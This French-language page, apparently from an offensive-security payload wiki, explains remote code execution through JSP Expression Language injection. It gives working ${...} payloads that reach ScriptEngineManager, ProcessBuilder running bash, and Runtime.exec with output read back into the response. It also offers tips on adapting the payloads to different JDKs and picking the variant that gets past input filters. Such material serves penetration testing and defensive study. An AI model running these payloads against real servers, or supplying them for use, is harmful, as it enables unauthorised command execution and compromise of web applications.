---
title: "Exécution de code JSP EL : de la réflexion à ProcessBuilder via l'unified EL"
description: "L'unified EL de JSP invoque des méthodes à partir de la 2.2, donc une expression ${...} injectée atteint la réflexion, un moteur de script ou ProcessBuilder pour exécuter des commandes dans le conteneur de servlets."
keywords:
  - exécution de code JSP EL
  - invocation de méthode unified EL
  - ScriptEngineManager EL
  - réflexion ProcessBuilder
  - RCE EL
---

# Exécution de code

L'invocation de méthode est entrée dans l'unified EL à la révision 2.2, qui est la base sur tout conteneur de servlets moderne. Dès qu'une expression EL appelle des méthodes, un littéral devient le début d'une chaîne de réflexion : `getClass()` sur n'importe quel objet donne une `Class`, `forName(...)` charge un type arbitraire, et le type chargé est instancié et piloté au travers de ses méthodes. L'EL n'a pas de `new` sur un type nommé ni d'`import`, donc le runtime de l'hôte est toujours atteint par réflexion plutôt que par une référence de type directe.

## Voie du moteur de script

Exécuter un langage de script via `javax.script` est le chemin le plus court. Un littéral de chaîne vide donne une `String`, `getClass()` donne sa `Class`, et `forName` charge le `ScriptEngineManager`, dont le moteur JavaScript évalue du Java arbitraire :

```jsp
${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
```

`newInstance()` réussit parce que `ScriptEngineManager` possède un constructeur public sans argument. Le moteur JavaScript (Nashorn) est fourni avec le JDK jusqu'à la version 14, donc cette voie dépend du fait que le runtime l'embarque ou qu'un autre moteur JSR-223 soit présent sur le classpath.

## De la réflexion à ProcessBuilder

Là où aucun moteur de script n'est disponible, l'expression atteint `ProcessBuilder` directement. Il possède un constructeur varargs `String...`, donc un constructeur déclaré est instancié avec le tableau de commande puis démarré :

```jsp
${''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['/bin/bash','-c','id; uname -a']).start()}
```

L'index `[0]` suppose que le premier constructeur déclaré est la forme à tableau ; si l'ordre diffère sur un JDK donné, parcourez le tableau de constructeurs et sélectionnez celui dont le type de paramètre correspond. `ProcessBuilder` exécute le programme sans shell, donc `;`, les pipes et les redirections appartiennent à l'intérieur de la chaîne `bash -c`, pas autour d'elle.

## Récupérer la sortie

Pour ramener la sortie de commande dans la réponse au lieu d'exécuter à l'aveugle, videz le flux du processus dans la même expression :

```jsp
${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id').getInputStream()).useDelimiter('\\A').next()}
```

La forme `Runtime` (`getMethod('getRuntime').invoke(null).exec(...)`) et la forme `ProcessBuilder` sont interchangeables ; choisissez celle qui survit au filtrage devant le puits.

## Outils

- **Burp Suite** : Repeater pour délivrer des payloads de réflexion ${...} et lire la sortie.
- **J2EEScan** : extension Burp qui signale l'injection Java EL.
- Réflexion unified-EL manuelle vers ScriptEngineManager ou ProcessBuilder.

## Références

- [Jakarta Expression Language Specification](https://jakarta.ee/specifications/expression-language/)
- [PayloadsAllTheThings: Java EL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
